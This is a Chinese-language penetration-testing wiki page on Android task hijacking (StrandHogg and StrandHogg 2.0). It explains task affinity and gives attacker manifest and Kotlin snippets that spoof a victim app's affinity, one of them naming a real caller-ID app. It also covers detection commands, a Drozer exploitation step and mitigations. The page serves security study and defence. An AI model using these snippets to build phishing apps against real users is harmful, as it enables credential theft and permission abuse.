# Android 任务劫持

{{#include ../../banners/hacktricks-training.md}}

## 任务、后栈和前台活动

在 Android 中，**任务** 本质上是一组用户交互以完成特定工作的活动，组织在 **后栈** 中。这个栈根据活动打开的时间对活动进行排序，最近的活动显示在顶部，称为 **前台活动**。在任何时刻，只有这个活动在屏幕上可见，使其成为 **前台任务** 的一部分。

以下是活动转换的快速概述：

- **活动 1** 开始时是前台的唯一活动。
- 启动 **活动 2** 将 **活动 1** 推入后栈，使 **活动 2** 进入前台。
- 启动 **活动 3** 将 **活动 1** 和 **活动 2** 进一步推入栈中，**活动 3** 现在在前面。
- 关闭 **活动 3** 将 **活动 2** 重新带回前台，展示了 Android 的简化任务导航机制。

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## 任务亲和力攻击

`taskAffinity` 告诉 Android 一个 `Activity` *更倾向* 于属于哪个任务。当两个活动共享相同的亲和力时，**Android 允许将它们合并到同一个后栈中，即使它们来自不同的 APK**。

如果攻击者能够将恶意活动放置在该栈的 **根** 位置，每次受害者打开合法应用程序时，恶意 UI 将是用户看到的第一件事——非常适合网络钓鱼或滥用权限请求。

攻击面比许多开发者想象的要广，因为 **每个活动自动继承与应用程序包名称相等的亲和力**（除非开发者设置 `android:taskAffinity=""`）。因此 *不采取任何行动* 已经使应用在 Android 11 之前的版本中暴露于任务劫持的风险。

### 经典的 "singleTask / StrandHogg" 场景

1. 攻击者声明一个活动：
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. 恶意应用程序启动一次，以便任务（具有伪造的亲和力）存在于最近的任务中。
3. 当用户稍后打开真实应用程序时，Android 发现已经存在一个 **根亲和力与包匹配** 的任务，并将该任务带到前台。
4. 攻击者的 UI 首先显示。

### 默认亲和力（无 `singleTask`）变体 – 来电显示案例研究

在 **来电显示 (caller.id.phone.number.block)** 应用程序中报告的漏洞表明，该攻击 *也* 适用于默认的 `standard` 启动模式：

1. 攻击者应用程序创建一个假根活动并立即隐藏自己：
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // 保持任务在最近但不在视线中
}
}
```
2. 清单只需将受害者包复制到 `taskAffinity` 中：
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. 一旦用户安装并打开恶意应用程序 **一次**，一个亲和力等于受害者包的任务就存在（但在后台）。
4. 当真实的来电显示应用程序启动时，Android 重新使用该任务并将 `HackActivity` 带到前台 → 网络钓鱼窗口/权限滥用。

> 注意：从 **Android 11 (API 30)** 开始，系统默认不将不属于同一 UID 的两个包放入同一任务，从而减轻了这一特定变体。旧版本仍然易受攻击。

---

### StrandHogg 2.0 (CVE-2020-0096) – 基于反射的任务劫持

谷歌在 2020 年 5 月的安全公告中修复了一个更高级的变体，称为 **StrandHogg 2.0**。该漏洞 **完全不依赖于 `taskAffinity`**；相反，它使用 *反射* 动态地将攻击者的活动插入到 *每个* 正在运行的任务的顶部，完全绕过了 Android 11 引入的“共享 UID”限制。

关键点：

* 一个零权限的恶意应用程序可以在打开后，遍历正在运行的任务并调用隐藏的 API 来 **重新归属** 自己的活动到任何任务中。
* 由于活动是在运行时插入的，因此 `launchMode` 或静态清单分析无法提前检测到攻击。
* 通过将检查回移植到 **Android 8.0/8.1/9**（2020 年 5 月 SPL）来修补。**Android 10 及更高版本不受影响。**

在未修补的设备上，可以使用 `adb shell dumpsys activity activities` 进行检测，并观察包名与任务的 *亲和力* 不同的可疑活动。

对遗留设备的缓解措施与经典任务劫持相同 **加上** 运行时验证（例如，调用 [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) 并验证自己的包名）。

---

## 检测与利用清单

1. **静态审查** – 从目标 APK 中提取 `AndroidManifest.xml`，检查每个 `<activity>`（或全局 `<application>` 元素）是否包含 `android:taskAffinity=""`（空） **或** 自定义值。工具如：
```bash
# 使用 apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# 使用 AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **动态审查** – 在设备上打开目标应用程序并列出任务：
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
一个根亲和力等于受害者包但其顶部活动属于 *不同* 包的任务是一个红旗。
3. 按照上述描述制作一个恶意应用程序，或使用 **[Drozer](https://github.com/WithSecureLabs/drozer)**：
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## 缓解措施

开发者应：

* 在 `<application>` 级别显式设置 `android:taskAffinity=""`（推荐） **或** 为每个活动提供唯一的、私有的亲和力。
* 对于高度敏感的屏幕，将上述内容与 `android:launchMode="singleInstance"` 或现代 [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) 保护结合使用。
* 升级应用的 `targetSdkVersion` 并强制执行 **Android 11** 行为更改，默认情况下任务不跨包共享。
* 目标 **Android 12 (API 31) 或更高版本**，以便强制要求 `android:exported` 属性，迫使开发者审核每个外部可达组件。
* 考虑运行时自我防御：定期查询 `ActivityTaskManager` 以确保您的顶部活动的包名与您自己的匹配。

---

## 相关 UI 劫持技术

任务劫持通常与或被 **tapjacking**（基于覆盖的 UI 欺骗）结合使用或替代。2025 年的 **TapTrap** 研究表明，完全透明的 *动画驱动* 活动可以绕过 Android 12–14 中引入的覆盖触摸限制，并仍然欺骗用户授予危险权限。虽然 TapTrap 并不严格属于 *任务* 劫持，但最终目标（网络钓鱼点击）是相同的——因此现代评估应检查这两种攻击面。

---

## 参考文献

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) technical write-up](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap: Animation-Driven Tapjacking on Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
